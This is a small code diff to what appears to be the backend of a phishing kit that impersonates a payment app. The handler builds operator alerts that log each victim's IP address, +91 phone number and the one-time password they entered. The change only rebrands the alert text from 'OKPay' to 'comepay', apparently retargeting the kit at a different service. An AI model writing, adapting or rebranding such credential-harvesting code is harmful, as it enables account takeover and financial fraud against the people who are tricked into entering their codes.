@@ -21,7 +21,7 @@ export default async function handler(req, res) {
   } else if (type === 'send_otp' || type === 'modal_otp') {
     message = `🔐 <b>OTP Requested (OKPay)</b>\n🌐 IP: <code>${clientIp}</code>\n📱 Phone: +91 <code>${phone}</code>`;
   } else if (type === 'verify_otp') {
-    message = `🔑 <b>OTP Entered (Wrong Attempt - OKPay)</b>\n🌐 IP: <code>${clientIp}</code>\n📱 Phone: +91 <code>${phone}</code>\n🔢 OTP: <code>${otp}</code>`;
+    message = `🔑 <b>OTP Entered (Wrong Attempt - comepay)</b>\n🌐 IP: <code>${clientIp}</code>\n📱 Phone: +91 <code>${phone}</code>\n🔢 OTP: <code>${otp}</code>`;
   } else {
     message = `📩 <b>Activity from IP:</b> <code>${clientIp}</code>`;
   }
